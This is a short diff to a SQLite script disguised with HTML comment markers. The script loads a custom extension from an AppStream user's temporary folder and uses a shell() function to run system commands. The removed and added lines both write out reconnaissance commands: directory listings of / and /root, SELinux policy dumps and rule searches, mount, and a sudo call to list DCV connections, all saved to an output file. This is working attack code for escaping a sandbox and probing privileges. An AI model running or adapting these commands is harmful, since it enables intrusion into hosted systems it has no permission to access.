@@ -1,4 +1,4 @@
 -- <html>
 .load /home/as2-streaming-user/MyFiles/TemporaryFiles/extension
-select shell("(ls -al /;ls -al /mnt;ls -al /opt/;ls -al /opt/rh/;ls -l /etc/selinux/targeted/policy/policy.*;getenforce;seinfo --stats;sesearch --allow -s unconfined_t;ls -al /root/;find /sys/fs/selinux -type f -readable 2>/dev/null;semodule -l;seinfo -a;seinfo -t;seinfo --stats) > /home/as2-streaming-user/MyFiles/TemporaryFiles/output.txt");
+select shell("(cat /etc/selinux/targeted/policy/policy.31; mount; sudo /usr/bin/dcv list-connections;) > /home/as2-streaming-user/MyFiles/TemporaryFiles/output.txt");
 -- </html>
